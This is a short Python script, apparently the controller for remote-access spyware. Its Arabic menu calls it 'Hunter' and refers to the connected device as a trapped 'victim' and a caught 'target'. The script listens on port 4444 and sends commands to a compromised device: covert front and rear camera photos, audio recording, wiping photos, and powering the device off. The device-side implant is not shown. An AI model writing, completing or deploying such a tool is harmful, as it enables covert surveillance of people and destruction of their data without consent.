import socket

def screen():
    print("-" * 30)
    print("  لوحة تحكم Hunter - اختر رقمًا:")
    print("-" * 30)
    print("1 - تصوير سيلفي (أمامية)")
    print("2 - تصوير كاميرا خلفية")
    print("3 - تسجيل صوت (10 ثواني)")
    print("4 - فرمتة ومسح الصور")
    print("5 - إطفاء الجهاز")
    print("0 - إغلاق الاتصال")
    print("-" * 30)

def start():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    print("...في انتظار دخول الضحية للفخ")
    conn, addr = s.accept()
    print(f"تم صيد هدف من: {addr}")

    while True:
        screen()
        cmd = input("Hunter_Command > ")
        if cmd == '0': break
        conn.send(cmd.encode())
        print("Done! تم إرسال الأمر")

start()
